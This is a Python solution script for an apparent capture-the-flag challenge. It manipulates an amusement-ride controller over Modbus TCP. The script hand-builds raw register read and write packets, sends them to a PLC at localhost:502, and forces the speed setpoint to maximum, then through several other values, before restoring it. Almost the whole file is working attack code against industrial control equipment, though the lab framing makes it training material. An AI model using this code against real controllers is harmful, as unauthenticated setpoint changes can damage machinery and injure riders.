#!/usr/bin/env python3
"""
CTF Challenge 4: Speed Control (Hard - 300 points)
Modify the ride speed setpoint through holding register manipulation

Method: Write to holding register %MW0 (speed_setpoint)
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_register(transaction_id, address, value):
    """Build a Modbus Write Single Register request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 6

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        value
    )

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def main():
    print("="*60)
    print("CTF Challenge 4: Speed Control")
    print("="*60)
    print()
    print("Objective: Modify ride speed through register manipulation")
    print("Method: Write to speed_setpoint register")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    print("\n[Phase 1] Reading current speed setpoint...")
    request = build_read_register(transaction_id, 0, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        current_speed = registers[0]
        print(f"  Current Speed Setpoint: {current_speed}%")

    transaction_id += 1

    print("\n[Phase 2] Setting speed to MAXIMUM (100%)...")
    # Write 100 to register 0 (speed_setpoint)
    request = build_write_register(transaction_id, 0, 100)
    sock.send(request)
    response = sock.recv(1024)
    print("  ✓ Write command sent")

    transaction_id += 1
    time.sleep(0.5)

    print("\n[Phase 3] Verifying speed change...")
    request = build_read_register(transaction_id, 0, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        new_speed = registers[0]
        print(f"  New Speed Setpoint: {new_speed}%")

        if new_speed == 100:
            print("\n🎯 SUCCESS! Speed set to maximum")
            print("   Challenge completed!")
        else:
            print(f"\n⚠️  Speed is {new_speed}% (expected 100%)")

    transaction_id += 1

    print("\n[Phase 4] Demonstrating speed manipulation...")
    speeds = [75, 25, 0, 50]

    for target_speed in speeds:
        print(f"\n  Setting speed to {target_speed}%...")
        request = build_write_register(transaction_id, 0, target_speed)
        sock.send(request)
        sock.recv(1024)
        transaction_id += 1
        time.sleep(0.5)

        request = build_read_register(transaction_id, 0, 1)
        sock.send(request)
        response = sock.recv(1024)
        registers = parse_read_registers_response(response)

        if registers:
            print(f"    Verified: {registers[0]}%")
        transaction_id += 1

    print("\n[Phase 5] Restoring default speed (50%)...")
    request = build_write_register(transaction_id, 0, 50)
    sock.send(request)
    sock.recv(1024)
    print("  ✓ Speed restored to 50%")

    print("\n[Impact Analysis]")
    print("  • Speed manipulation can cause unsafe ride conditions")
    print("  • Exceeding design limits may damage equipment")
    print("  • Too slow: ride may not complete circuit properly")
    print("  • Too fast: excessive forces on riders and structure")

    sock.close()

if __name__ == '__main__':
    main()
